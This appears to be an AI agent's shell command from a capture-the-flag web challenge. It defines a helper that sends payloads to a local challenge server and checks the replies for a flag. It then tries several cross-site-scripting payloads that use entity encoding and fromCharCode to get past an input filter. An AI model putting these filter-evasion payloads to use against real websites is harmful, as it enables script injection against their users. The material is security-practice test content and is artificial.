input.command:
check() {
  out=$(curl -s "http://127.0.0.1:64240/page" --data-urlencode "name=$1" -G 2>&1)
  echo "$out" | grep -q "success_triangle" && { echo "SUCCESS [$1]"; echo "$out"|grep -o 'FLAG{[0-9a-f]*}'; }
  echo "[$1] $(echo "$out"|grep -o 'alt="[^"]*"'|head -1) $(echo "$out"|grep -o "can't use: '[^']*'")"
}
check '<img src=x onerror="alert(&#39;XSS&#39;)">'
check '<img src=x onerror=alert(&#39;XSS&#39;)>'
check '<img src=x onerror=alert(&apos;XSS&apos;)>'
check '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'
check '<svg><script>alert("XSS")</script>'
